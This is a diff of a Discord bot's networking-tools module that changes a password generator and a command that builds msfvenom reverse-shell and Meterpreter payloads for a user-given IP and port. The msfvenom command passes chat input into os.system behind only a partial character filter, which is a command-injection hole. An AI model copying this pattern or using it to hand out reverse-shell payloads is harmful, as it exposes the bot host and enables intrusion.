@@ -122,37 +122,39 @@ class networkingtools(commands.Cog):
                     await ctx.send(f"```Unable to validate DNS\n{text}```")
 
     @commands.command(name="passgen", description="generates a number of passwords with a given length", aliases=["passwordgenerator", "password"])
-    async def passwords(self, ctx, number: int, length: int):
-        if number in range(0, 26) is False or length in range(3, 51) is False:
-            await ctx.send("You must have at least 1 password with 4 characters")
+    async def passwords(self, ctx, length: int, number=1):
+        text = "Usage: ./passgen [length] (number)"
+        if number <= 25 and number >= 1:
+            if length <= 25 and length >= 4:
+                embed = Embed(title="Passwords ",
+                              description=f"{number} passwords of {length} length",
+                              colour=discord.Colour.random())
+                i = 0
+                num = 0
+                passwords = set({})
+                while i != number:
+                    output = passgen.passgen(length=length, punctuation=True, digits=True, letters=True, case='both')
+                    passwords.add(output)
+                    i += 1
+                for password in passwords:
+                    embed.add_field(name=f"Password {num + 1}", value=password, inline=False)
+                    num += 1
+                time = ctx.message.created_at
+                embed.set_footer(text=f"Asked by {ctx.author.name} " + time.strftime("%d/%m/%y %X"))
+                await ctx.author.send(embed=embed)
+                await ctx.send("Passwords were send to your DMs!")
+            else:
+                await ctx.send(f"```Length must be between 4 and 25\n{text}```")
         else:
-
-            embed = Embed(title="Passwords ",
-                          description=f"{number} passwords of {length} length: ",
-                          colour=discord.Colour.random())
-            i = 0
-            num = 0
-            passwords = set({})
-            while i != number:
-                output = passgen.passgen(length=length, punctuation=True, digits=True, letters=True, case='both')
-                passwords.add(output)
-                i += 1
-            for password in passwords:
-                embed.add_field(name=f"Password {num + 1}", value=password)
-                num += 1
-            time = ctx.message.created_at
-            embed.set_footer(text=f"Asked by {ctx.author.name} " + time.strftime("%d/%m/%y %X"))
-            await ctx.author.send(embed=embed)
-            await ctx.send("Passwords were send to your DMs!")
+            await ctx.send(f"```You must have between 1 and 25 passwords\n{text}```")
 
     @passwords.error
     async def passgen_error(self, ctx, error):
+        text = "Usage: ./passgen [amount] [length]"
         if isinstance(error, commands.BadArgument):
-            await ctx.send("Please enter args as integers")
+            await ctx.send(f"```Invalid number of passwords or length\n{text}```")
         elif isinstance(error, commands.MissingRequiredArgument):
             await ctx.send("Please enter the number of passwords and the length")
-        elif isinstance(error, commands.CommandInvokeError):
-            await ctx.send("Please ensure you ask for at least 1 password with at least 4 characters")
         else:
             raise
 
@@ -253,25 +255,19 @@ Requested by: {ctx.author.name}
             raise
 
     @commands.command(name="msfvenom", description="Geneate msf payload, for payloads type ./msfvenom options", aliases=["msfpayload"])
-    async def msfvenom(self, ctx, payload: str, ip=None, port=None):
+    async def msfvenom(self, ctx, payload=None, ip=None, port=None):
 
-        if payload == "options":
-            await ctx.send("""```accesslog
-Usage: ./msfvenom [payload] [ip] [port]
-Available payloads:
-    windows/meterpeter/reverse_tcp
-    windows/shell/reverse_tcp
-    linux/x64/shell/reverse_tcp
-    linux/x32/shell/reverse_tcp
-    Other payloads will be accepted in the same format and ouput as a txt```
-                """)
-        if validate_port(port) is True:
-            if validate_ip(ip) is True:
-                port = int(port)
-                if 1 <= port <= 65535:
+        text = "Usage: ./msfvenom [payload] [ip] [port]"
+        if payload is None:
+            await ctx.send(f"```{text}```")
+        else:
+            if validate_port(port) is True:
+                if validate_ip(ip) is True:
+                    port = int(port)
                     bad_chars = [';', ':', '!', '*', '#', '$', '(', ')']
                     payload = ''.join((filter(lambda i: i not in bad_chars, payload)))
                     payload = payload.lower()
+                    await ctx.send("Sending payload to your DMs!")
                     if payload == "windows/meterpeter/reverse_tcp":
                         os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o ./payloads/{ctx.author.id}_windows_meterpeter_reverse_tcp.bat")
                         await ctx.send(file=discord.File(f"./payloads/{ctx.author.id}_windows_meterpeter_reverse_tcp.bat"))
@@ -293,15 +289,15 @@ Available payloads:
                         await ctx.send(file=discord.File(f"./payloads/{ctx.author.id}_payload.txt"))
                         os.remove(f"./payloads/{ctx.author.id}_payload.txt")
                 else:
-                    print("Please enter a  valid IP address")
+                    await ctx.send(f"```Please enter a  valid IP address\n{text}```")
             else:
-                print("Please enter a valid port")
+                await ctx.send(f"```Please enter a valid port\n{text}```")
 
 
     @msfvenom.error
     async def msfvenom_error(self, ctx, error):
         if isinstance(error, commands.MissingRequiredArgument):
-            await ctx.send("Please enter a payload, IP and port. Use ./msfvenom options for a list of avilable payloads")
+            await ctx.send("```./msfvenom [payload] [ip] [port]```")
         else:
             raise
     @commands.command(name="cvesearch", description="Search", alises=["cveid", "cvelookup"])
